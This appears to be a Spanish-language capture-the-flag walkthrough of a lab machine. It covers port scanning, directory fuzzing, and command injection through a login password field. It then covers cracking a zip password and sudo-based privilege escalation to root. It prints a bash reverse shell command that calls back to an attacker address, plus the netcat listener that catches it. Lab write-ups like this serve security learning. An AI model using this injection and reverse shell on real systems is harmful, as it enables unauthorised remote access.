![](Pasted%20image%2020251004115112.png)

ENUMERACIÓN.
--------------------------

Escaneo de puertos. 

```
nmap -p- -n -Pn --open -sSC --min-rate 5000 -vvv 10.0.2.11
```

![](Pasted%20image%2020251004115735.png)

Tenemos dos puertos 80 y 20. 

Vamos a mirar la página web: 

![](Pasted%20image%2020251004115902.png)

Hacemos fuzzing web por si nos encontramos algún subdirectorio que nos proporcione más información. 

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://10.0.2.11
```

Nos sale lo siguiente que parece interesante: 

![](Pasted%20image%2020251004120352.png)

En el subdirectorio de login.html no sale esto : 

![](Pasted%20image%2020251004120525.png)

Podemos hacer una reversell. 

Hacemos un id porque tenemos control remoto de comando: 

![](Pasted%20image%2020251004121548.png)

Tenemos tres usuarios pronike, proadidas y root.

Hacemos una reversershell con el siguiente comando: 

```
bash -c 'sh -i >& /dev/tcp/10.0.2.4/1990 0>&1'
```
Este comando lo metemos en la contraseña. 

Luego hacemos netcat: 

```
nc -lvnp 1990
```

![](Pasted%20image%2020251012133035.png)

Hacemos un tratamiento de la TTY. 

Y ya lo tendríamos estabilizado. 

![](Pasted%20image%2020251012133242.png)

Nos vamos a ver que usuarios tiene.

![](Pasted%20image%2020251012133715.png)

No podemos ver en proadidas. 

Miramos las carpetas y vemos que en /opt vemos un importante.zip

![](Pasted%20image%2020251012134103.png)

Ahora ponemos base64 y la carpeta. 
Y luego pondremos lo siguiente: 

![](Pasted%20image%2020251012134325.png)

Hacemos un unzip de la carpeta pero hay que meter contraseña. 

![](Pasted%20image%2020251012134745.png)

![](Pasted%20image%2020251012135034.png)

Usamos john . 

![](Pasted%20image%2020251012135212.png)

Y ahí tenemos la contraseña de .zip


![](Pasted%20image%2020251012135408.png)

Nos metemos en el usuario de pronike

![](Pasted%20image%2020251012135528.png)

Ya somos ese usuario. 

Hacemos un sudo -l y nos vamos a l apágina de gtfgobins . 


![](Pasted%20image%2020251012140056.png)

![](Pasted%20image%2020251012140250.png)

Ahora somos usuario proadidas. 

![](Pasted%20image%2020251012140435.png)

Ahora somos root. 


Y ya sólo buscar los flags. 